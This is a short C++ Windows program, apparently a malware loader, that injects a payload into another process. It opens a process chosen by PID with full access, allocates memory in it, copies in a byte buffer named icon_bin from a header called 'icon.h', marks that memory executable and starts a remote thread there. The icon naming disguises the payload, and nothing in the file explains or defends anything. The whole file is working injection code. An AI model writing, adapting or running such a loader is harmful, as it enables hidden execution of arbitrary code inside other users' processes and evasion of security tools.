#include <windows.h>
#include <iostream>
#include "icon.h"

int main(int argc, char *argv[])
{
	DWORD pid = atoi(argv[1]);
	

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (!hProcess){return 1;}

	LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, icon_bin_len,  MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE); 
	if (!remoteBuffer){return 1;}
	
	BOOL write = WriteProcessMemory(hProcess, remoteBuffer, icon_bin, icon_bin_len, NULL);
	if (!write){return 1;}

	DWORD oldProtect;
	BOOL perm = VirtualProtectEx(hProcess, remoteBuffer, icon_bin_len, PAGE_EXECUTE_READ, &oldProtect);
	if (!perm){return 1;}

	HANDLE thread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	if (!thread){return 1;}

	return 0;
}
